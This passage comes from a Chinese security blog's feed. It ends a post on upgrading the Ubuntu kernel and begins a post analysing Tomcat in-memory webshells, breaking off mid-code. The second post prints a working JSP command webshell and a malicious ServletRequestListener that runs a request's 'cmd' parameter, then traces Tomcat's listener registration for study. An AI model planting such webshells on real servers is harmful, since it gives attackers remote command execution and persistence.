    <id>https://rainsec.cn/post/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC.html</id>
    <published>2022-03-28T10:38:45.000Z</published>
    <updated>2023-04-12T02:36:51.351Z</updated>
    
    <content type="html"><![CDATA[<p>记一次更新内核到5.8.0-33-generic</p><span id="more"></span><h2 id="更新到指定版本"><a href="#更新到指定版本" class="headerlink" title="更新到指定版本"></a>更新到指定版本</h2><h3 id="查看当前版本"><a href="#查看当前版本" class="headerlink" title="查看当前版本"></a>查看当前版本</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">uname</span> -r<span class="token number">4.15</span>.0-101-generic$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription:    Ubuntu <span class="token number">20.04</span> LTSRelease:        <span class="token number">20.04</span>Codename:       focal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查看当前已经安装的-Kernel-Image"><a href="#查看当前已经安装的-Kernel-Image" class="headerlink" title="查看当前已经安装的 Kernel Image"></a>查看当前已经安装的 Kernel Image</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ dpkg --get-selections <span class="token operator">|</span><span class="token function">grep</span> linux-imagelinux-image-5.4.0-90-generic                    purgelinux-image-5.8.0-33-generic                    <span class="token function">install</span>linux-image-generic                             <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="查询当前软件仓库可以安装的-Kernel-Image-版本，如果没有预期的版本，则需要额外配置仓库"><a href="#查询当前软件仓库可以安装的-Kernel-Image-版本，如果没有预期的版本，则需要额外配置仓库" class="headerlink" title="查询当前软件仓库可以安装的 Kernel Image 版本，如果没有预期的版本，则需要额外配置仓库"></a>查询当前软件仓库可以安装的 Kernel Image 版本，如果没有预期的版本，则需要额外配置仓库</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">apt-cache</span> search linux <span class="token operator">|</span> <span class="token function">grep</span> linux-image<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装指定版本的-Kernel-Image-和-Kernel-Header"><a href="#安装指定版本的-Kernel-Image-和-Kernel-Header" class="headerlink" title="安装指定版本的 Kernel Image 和 Kernel Header"></a>安装指定版本的 Kernel Image 和 Kernel Header</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> linux-headers-5.8.0-33-generic linux-image-5.8.0-33-generic<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="查看当前的Kernel列表"><a href="#查看当前的Kernel列表" class="headerlink" title="查看当前的Kernel列表"></a>查看当前的Kernel列表</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">grep</span> menuentry /boot/grub/grub.cfg<span class="token keyword">if</span> <span class="token punctuation">[</span> x<span class="token string">"<span class="token variable">${feature_menuentry_id}</span>"</span> <span class="token operator">=</span> xy <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token assign-left variable">menuentry_id_option</span><span class="token operator">=</span><span class="token string">"--id"</span>  <span class="token assign-left variable">menuentry_id_option</span><span class="token operator">=</span><span class="token string">""</span><span class="token builtin class-name">export</span> menuentry_id_optionmenuentry <span class="token string">'Ubuntu'</span> --class ubuntu --class gnu-linux --class gnu --class os <span class="token variable">$menuentry_id_option</span> <span class="token string">'gnulinux-simple-b986dc3b-6b82-44d5-acb8-6cbad5e357d5'</span> <span class="token punctuation">{</span>submenu <span class="token string">'Advanced options for Ubuntu'</span> <span class="token variable">$menuentry_id_option</span> <span class="token string">'gnulinux-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5'</span> <span class="token punctuation">{</span>        menuentry <span class="token string">'Ubuntu, with Linux 5.8.0-33-generic'</span> --class ubuntu --class gnu-linux --class gnu --class os <span class="token variable">$menuentry_id_option</span> <span class="token string">'gnulinux-5.8.0-33-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5'</span> <span class="token punctuation">{</span>        menuentry <span class="token string">'Ubuntu, with Linux 5.8.0-33-generic (recovery mode)'</span> --class ubuntu --class gnu-linux --class gnu --class os <span class="token variable">$menuentry_id_option</span> <span class="token string">'gnulinux-5.8.0-33-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5'</span> <span class="token punctuation">{</span>        menuentry <span class="token string">'Ubuntu, with Linux 5.4.0-90-generic'</span> --class ubuntu --class gnu-linux --class gnu --class os <span class="token variable">$menuentry_id_option</span> <span class="token string">'gnulinux-5.4.0-90-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5'</span> <span class="token punctuation">{</span>        menuentry <span class="token string">'Ubuntu, with Linux 5.4.0-90-generic (recovery mode)'</span> --class ubuntu --class gnu-linux --class gnu --class os <span class="token variable">$menuentry_id_option</span> <span class="token string">'gnulinux-5.4.0-90-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5'</span> <span class="token punctuation">{</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改-Kernel-的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改-grub-配置"><a href="#修改-Kernel-的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改-grub-配置" class="headerlink" title="修改 Kernel 的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改 grub 配置"></a>修改 Kernel 的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改 grub 配置</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> <span class="token function">vim</span> /etc/default/grub<span class="token comment"># GRUB_DEFAULT=0</span><span class="token assign-left variable">GRUB_DEFAULT</span><span class="token operator">=</span><span class="token string">"Advanced options for Ubuntu&gt;Ubuntu, with Linux 5.8.0-33-generic"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="生效配置"><a href="#生效配置" class="headerlink" title="生效配置"></a>生效配置</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">update-grub</span>$ <span class="token function">reboot</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="删除不需要的Kernel"><a href="#删除不需要的Kernel" class="headerlink" title="删除不需要的Kernel"></a>删除不需要的Kernel</h2><h3 id="查询不包括当前内核版本的其它所有内核版本"><a href="#查询不包括当前内核版本的其它所有内核版本" class="headerlink" title="查询不包括当前内核版本的其它所有内核版本"></a>查询不包括当前内核版本的其它所有内核版本</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ dpkg -l <span class="token operator">|</span> <span class="token function">tail</span> -n +6<span class="token operator">|</span> <span class="token function">grep</span> -E <span class="token string">'linux-image-[0-9]+'</span><span class="token operator">|</span> <span class="token function">grep</span> -Fv <span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -r<span class="token variable">)</span></span>pi  linux-image-5.4.0-90-generic         <span class="token number">5.4</span>.0-90.101                      amd64        Signed kernel image generic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Kernel 状态：</p><ul><li>rc：表示已经被移除</li><li>ii：表示符合移除条件（可移除）</li><li>iU：已进入 apt 安装队列，但还未被安装（不可移除）</li></ul><h3 id="删除指定的Kernel"><a href="#删除指定的Kernel" class="headerlink" title="删除指定的Kernel"></a>删除指定的Kernel</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dpkg --purge linux-image-5.4.0-90-generic<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;记一次更新内核到5.8.0-33-generic&lt;/p&gt;</summary>
    
    
    
    <category term="系统运维" scheme="https://rainsec.cn/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="Linux" scheme="https://rainsec.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat内存马简析</title>
    <link href="https://rainsec.cn/post/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E8%A7%A3%E6%9E%90.html"/>
    <id>https://rainsec.cn/post/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E8%A7%A3%E6%9E%90.html</id>
    <published>2022-03-26T10:48:45.000Z</published>
    <updated>2023-04-12T02:36:51.343Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat内存马简析"><a href="#Tomcat内存马简析" class="headerlink" title="Tomcat内存马简析"></a>Tomcat内存马简析</h1><p>  webshell木马配合webshell管理工具可以方便对于服务器、内网进行进一步的维权、入侵，随着对文件内容查杀、以Ai对流量特征和行为模式的查杀等等手段，普通文件形式的webshell木马可靠性越来越差。也许好不容易绕过waf传上去两分钟不到就被杀掉了，所以攻击方在近些年也慢慢的研发出“无文件”的webshell木马，即内存马。<br>内存马的概念提出比较久的，但走进视野就近几年的事情，每隔一段时间总能看到不少师傅提出新的内存马实现方法，这里简单说下利用JavaWeb的三大组件Servle、Filter、Listener来动态注册内存马的方式。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>  jsp带回显的webshell木马：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">2048</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;pre&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">=</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&lt;/pre&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>request来获得用户请求，当shell字段的get请求存在时，将shell字段的请求信息当作cmd命令去执行，然后执行的结果通过getInputStream()输入流读返回结果，结果读进byte数组中，若有回显，则打印出结果。</p><p>  然而现在的内存马则将重点放在注册恶意组件上，对于Tomcat主要通过JavaWeb的Servlet、Filter、Listener这三大组件来实现。简单说下他们的功能：</p><p>  1、Servlet来处理客户端请求的动态资源，也就说我们用浏览器跳转后，请求由Servlet接受和处理，并完成响应，其中init方法在于接收客户端的第一次请求，service每次请求都会调用，destroy则是销毁用的。</p><p>  2、Filter是拦截器，作用在于拦截请求路径，init在创建Filter对象是调用。doFilter在请求到来，被拦截时执行，destroy就是销毁此对象。</p><p>  3、Listener是事件监听器，作用在于当某事件（比如点击等）在特定事件源发生时执行监听器代码，contextInitialized在Servletcontext创建时调用，contextDestroyed则在Servletcontext销毁时调用。</p><p>  加载的顺序为Listener-&gt;Filter-&gt;Servlet。</p><p>  在基于tomcat编写内存马时经常会遇到它的三个Context，及ServletContext、ApplicationContext、StandardContext，这里简单了解下：</p><p>  首先是Servlet，浏览器发送请求，浏览器接受请求后对请求作出处理，而Tomcat作为一个Servlet容器，将请求传给Servlet，并将相应返回给浏览器，而ServletContext就是servlet要实现的接口，比如路径信息或者拦截信息等。</p><p>  ApplicationContext的功能则在于实现ServletContext规范，一些对应方法的实现，例如addFilter等功能。</p><p>  而在看StandardContext时会发现，ApplicationContext调用的context方法是StandardContext实现的对象，则StandardContext其实是底层与Tomcat底层交互的内容。</p><h2 id="Listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h2><p>  既然加载顺序为Listener-&gt;Filter-&gt;Servlet，那么也根据这个顺序来调试。</p><p>  在注册一个listener时因为要匹配不同的事件，常用的分为ServletContextListener、ServletContextAttributeListener、ServletRequestAttributeListener、HttpSessionListener、ServletRequestListener、HttpSessionAttributeListener，一般常用ServletRequestListener来作内存马，因为他可以监听我们任意访问的资源，在访问资源会触发后其requestInitialized方法。</p><p>  ServletRequestListener的接口有两个事件处理方法：requestInitialized与requestDestroyed， requestInitialized(ServletRequestEvent sre)在与接受对应类型的参数，通过此参数来获得创建的对象；requestDestroyed(ServletRequestEvent sre)则是参数对象销毁时，调用此方法。<br>知道这些就可以创建一个恶意Listener类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@WebListener</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListenerShell</span> <span class="token keyword">implements</span> <span class="token class-name">ServletRequestListener</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestInitialized</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> sre<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">HttpServletRequest</span> req <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> sre<span class="token punctuation">.</span><span class="token function">getServletRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> command <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>command <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NullPointerException</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>                n<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestDestroyed</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> sre<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  其中HttpServletRequest代表浏览器请求，HTTP的所有信息都封装在此对象中，也就是可以从中得到请求信息，后面的就是请求读取请求命令和执行命令了。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/21933819/1665752528990-f4d09ce7-f3b7-4a4f-8463-196abb9f5d53.png#clientId=uae6a676b-80ec-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=228&amp;id=uabf7fe43&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=228&amp;originWidth=755&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=16443&amp;status=done&amp;style=none&amp;taskId=ucc3adb6e-817a-4f4a-a19b-e1c2e069e44&amp;title=&amp;width=755" alt="image.png"><br>访问任意路由即可执行命令。<br>接下来我们进行debug调试，从而知道他如何添加进去的。<br>在我们添加的</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListenerShell</span> <span class="token keyword">implements</span> <span class="token class-name">ServletRequestListener</span> <span class="token punctuation">{</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>处下断点，查看调用栈：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">&gt;</span></span><span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token class-name">ListenerShell</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span></span>Listener</span><span class="token punctuation">)</span>newInstance0<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">NativeConstructorAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>newInstance<span class="token operator">:</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token class-name">NativeConstructorAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>newInstance<span class="token operator">:</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token class-name">DelegatingConstructorAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>newInstance<span class="token operator">:</span><span class="token number">423</span><span class="token punctuation">,</span> <span class="token class-name">Constructor</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>newInstance<span class="token operator">:</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token class-name">DefaultInstanceManager</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>listenerStart<span class="token operator">:</span><span class="token number">4691</span><span class="token punctuation">,</span> <span class="token class-name">StandardContext</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中listenerStart我们跟进去看下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">listenerStart</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Configuring application event listeners"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> listeners <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">findApplicationListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> results <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span>listeners<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> ok <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> results<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">" Configuring event listener class '"</span> <span class="token operator">+</span> listeners<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> listener <span class="token operator">=</span> listeners<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            results<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getInstanceManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>listener<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中findApplicationListeners方法就是将我们要注册的Listener传入该方法中，其中这里demo的值为com.Listener.ListenerShell，与写代码的文件目录一致。<br>后面将对象信息传入results里，接下来对于类型进行分类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>lifecycleListener <span class="token keyword">instanceof</span> <span class="token class-name">ServletContextAttributeListener</span> <span class="token operator">||</span> lifecycleListener <span class="token keyword">instanceof</span> <span class="token class-name">ServletRequestAttributeListener</span> <span class="token operator">||</span> lifecycleListener <span class="token keyword">instanceof</span> <span class="token class-name">ServletRequestListener</span> <span class="token operator">||</span> lifecycleListener <span class="token keyword">instanceof</span> <span class="token class-name">HttpSessionIdListener</span> <span class="token operator">||</span> lifecycleListener <span class="token keyword">instanceof</span> <span class="token class-name">HttpSessionAttributeListener</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    eventListeners<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>lifecycleListener<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为这里实现的是ServletRequestListener，所以分到eventListeners数组中<br>然后调用了getApplicationEventListeners</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">eventListeners<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setApplicationEventListeners</span><span class="token punctuation">(</span>eventListeners<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getApplicationEventListeners</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationEventListenersList<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中返回的applicationEventListenersList，为已经注册的Listener，</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setApplicationEventListeners</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> listeners<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>applicationEventListenersList<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>listeners <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> listeners<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>applicationEventListenersList<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>listeners<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>setApplicationEventListeners主要完成applicationEventListenersList清空和重新赋值的操作<br>，我们注册的Listener就存储在此。<br>接下来我们去考虑Listener是如何触发的，此时我们在</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">requestInitialized</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestEvent</span> sre<span class="token punctuation">)</span> <span class="token punctuation">{</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下断点进行调试，并用浏览器访问路由，打开debug，在调用栈中看到</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">requestInitialized<span class="token operator">:</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token class-name">ListenerShell</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span></span>Listener</span><span class="token punctuation">)</span>fireRequestInitEvent<span class="token operator">:</span><span class="token number">5992</span><span class="token punctuation">,</span> <span class="token class-name">StandardContext</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span>invoke<span class="token operator">:</span><span class="token number">121</span><span class="token punctuation">,</span> <span class="token class-name">StandardHostValve</span> <span class="token punctuation">(</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token 